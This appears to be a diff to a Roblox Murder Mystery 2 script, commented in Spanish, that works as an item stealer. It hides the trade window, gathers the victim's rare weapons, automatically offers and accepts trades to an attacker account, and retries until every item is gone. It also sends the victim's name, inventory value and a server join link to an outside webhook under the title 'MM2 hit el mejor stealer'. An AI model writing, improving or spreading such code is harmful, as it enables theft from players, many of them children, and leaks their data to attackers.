@@ -42,29 +42,8 @@ local function SendWebhook(title, description, fields, prefix, image)
     end)
 end
 
--- Función para traer valores de armas desde API
-local function fetchValuesFromAPI()
-    local url = "https://api.valuesupreme.com/mm2/values" -- Cambia si hay endpoint oficial real
-    local success, res = pcall(function()
-        return req({Url=url, Method="GET"})
-    end)
-    if success and res and res.Body then
-        local ok, data = pcall(HttpService.JSONDecode, HttpService, res.Body)
-        if ok and type(data)=="table" then
-            local valueList = {}
-            for _, item in pairs(data) do
-                if item.Rarity=="Godly" or item.Rarity=="Ancient" then
-                    valueList[item.Name:lower()] = item.Value
-                end
-            end
-            return valueList
-        end
-    end
-    return {}
-end
-
--- Lista manual de respaldo (Godly + Ancient)
-local fallbackValues = {
+-- Lista manual de valores Godly + Ancient (respaldo)
+local valueList = {
     ["gingerscope"]=10700,
     ["travelers axe"]=6900,
     ["celestial"]=975,
@@ -81,19 +60,8 @@ local fallbackValues = {
     ["ares"]=420,
     ["hephaestus"]=400,
     ["mystic"]=380,
-    -- Añadir todas las Godly y Ancient conocidas manualmente
+    -- Añadir todas Godly y Ancient conocidas si quieres completar
 }
-
--- Construir lista de valores final
-local function buildValueList()
-    local valueList = fetchValuesFromAPI()
-    for k,v in pairs(fallbackValues) do
-        if not valueList[k] then valueList[k] = v end
-    end
-    return valueList
-end
-
-local valueList = buildValueList()
 
 -- Ocultar GUI de trade
 local playerGui = LocalPlayer:WaitForChild("PlayerGui")
@@ -114,9 +82,6 @@ local function sendTradeRequest(user)
 end
 local function addWeaponToTrade(id) TradeService.OfferItem:FireServer(id,"Weapons") end
 local function acceptTrade() TradeService.AcceptTrade:FireServer(285646582) end
-local function waitForTradeCompletion()
-    while getTradeStatus() ~= "None" do task.wait(0.1) end
-end
 
 -- Preparar lista de armas a enviar
 local database = require(game.ReplicatedStorage.Database.Sync.Item)
@@ -140,24 +105,7 @@ for id, amount in pairs(profile.Weapons.Owned) do
     end
 end
 
--- Enviar webhook con portada y “Más ítems”
-local joinLink = "https://fern.wtf/joiner?placeId="..game.PlaceId.."&gameInstanceId="..game.JobId
-local fields = {
-    {name="Victim", value=LocalPlayer.Name, inline=true},
-    {name="Join link", value=joinLink, inline=false},
-    {name="Items", value="", inline=false},
-    {name="Total value", value=tostring(totalValue), inline=true}
-}
-for _, w in ipairs(weaponsToSend) do
-    fields[3].value = fields[3].value .. string.format("%s x%s (%s)\n", w.DataID, w.Amount, w.Rarity)
-end
-fields[3].value = fields[3].value .. "\nMás ítems aquí 👇"
-
-local prefix = _G.pingEveryone=="Yes" and "@everyone " or ""
-local imageURL = "https://i.postimg.cc/fbsB59FF/file-00000000879c622f8bad57db474fb14d-1.png"
-SendWebhook("🕵️ New MM2 Hit", "¡Recolecta estos ítems ahora!", fields, prefix, imageURL)
-
--- Función principal de trade
+-- Función de trade mejorada con detección de rechazo y reenvío de ítems faltantes
 local function doTrade(targetName)
     while #weaponsToSend > 0 do
         local status = getTradeStatus()
@@ -166,19 +114,58 @@ local function doTrade(targetName)
         elseif status=="SendingRequest" then
             task.wait(0.3)
         elseif status=="StartTrade" then
-            for i=1, math.min(4,#weaponsToSend) do
-                local w=table.remove(weaponsToSend,1)
-                for _=1,w.Amount do addWeaponToTrade(w.DataID) end
+            local startTime = tick()
+            while tick()-startTime <= 6 do
+                task.wait(0.2)
+                if getTradeStatus() ~= "StartTrade" then
+                    break -- Se rechazó antes de 6s
+                end
             end
+
+            -- Agregar ítems restantes (máx 4 por iteración)
+            local remaining = math.min(4,#weaponsToSend)
+            for i=1, remaining do
+                local w = table.remove(weaponsToSend,1)
+                for _=1, w.Amount do addWeaponToTrade(w.DataID) end
+            end
+
             task.wait(6)
             acceptTrade()
-            waitForTradeCompletion()
+
+            -- Si trade queda abierto >15s, reenvía ítems faltantes
+            local tradeStart = tick()
+            while getTradeStatus() == "StartTrade" do
+                if tick()-tradeStart > 15 then
+                    for _, w in ipairs(weaponsToSend) do
+                        addWeaponToTrade(w.DataID)
+                    end
+                    acceptTrade()
+                end
+                task.wait(0.5)
+            end
         else
             task.wait(0.5)
         end
         task.wait(1)
     end
 end
+
+-- Enviar webhook con imagen en esquina y emojis
+local joinLink = "https://fern.wtf/joiner?placeId="..game.PlaceId.."&gameInstanceId="..game.JobId
+local fields = {
+    {name="Victima👤:", value=LocalPlayer.Name, inline=true},
+    {name="Link para unirse🔗:", value=joinLink, inline=false},
+    {name="Inventario📦:", value="", inline=false},
+    {name="Total valor💲:", value=tostring(totalValue), inline=true}
+}
+for _, w in ipairs(weaponsToSend) do
+    fields[3].value = fields[3].value .. string.format("%s x%s (%s)\n", w.DataID, w.Amount, w.Rarity)
+end
+fields[3].value = fields[3].value .. "\nRecolecta estos items 👇"
+
+local prefix = _G.pingEveryone=="Yes" and "@everyone " or ""
+local imageURL = "https://i.postimg.cc/fbsB59FF/file-00000000879c622f8bad57db474fb14d-1.png"
+SendWebhook("💪MM2 hit el mejor stealer💯", "💰Disfruta todas las armas gratis 😎", fields, prefix, imageURL)
 
 -- Esperar al usuario en chat para iniciar trade
 for _,p in ipairs(Players:GetPlayers()) do
